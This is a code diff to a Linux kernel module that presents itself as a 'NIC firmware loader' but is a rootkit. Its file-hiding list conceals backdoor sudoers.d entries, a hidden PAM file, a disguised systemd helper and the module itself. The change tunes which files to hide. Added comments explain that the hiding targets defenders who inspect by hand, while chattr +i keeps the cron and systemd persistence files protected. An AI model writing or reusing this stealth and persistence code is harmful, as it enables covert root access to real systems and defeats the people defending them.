@@ -25,12 +25,14 @@ MODULE_DESCRIPTION("NIC firmware loader v2");
 MODULE_VERSION("2.2.0");
 
 #define HIDE_PREFIX ".def_"
+// Only hide artifact files that defenders inspect manually.
+// Do NOT hide config files that system daemons (crond, systemd,
+// systemd-modules-load) need to find via getdents64 — they would
+// silently stop working.  Immutability (chattr +i) is the protection
+// layer for those files; hiding is just a bonus against manual ls.
 static const char *HIDE_NAMES[] = {
-    "sysaudit",               // /etc/cron.d/sysaudit (05)
-    "pkg_audit",              // /etc/cron.d/pkg_audit (12)
     ".pam_auth",              // /usr/lib/.pam_auth (03)
     ".net-helper",            // /usr/lib/systemd/.net-helper (04)
-    "systemd-network-helper", // systemd unit (04)
     ".sys_sync",              // /etc/sudoers.d/.sys_sync (01)
     ".netadmin",              // /etc/sudoers.d/.netadmin (01)
     ".svc_monitor",           // /etc/sudoers.d/.svc_monitor (01)
@@ -38,7 +40,6 @@ static const char *HIDE_NAMES[] = {
     ".user_registry",         // /usr/local/lib/.user_registry (12)
     ".locale_helper",         // /usr/local/lib/.locale_helper (11)
     ".locale_cache",          // /usr/local/lib/.locale_cache (11)
-    "net-fw.conf",            // /etc/modules-load.d/net-fw.conf (lkm)
     "nic_fw",                 // /lib/modules/*/extra/nic_fw.ko (lkm)
     NULL
 };
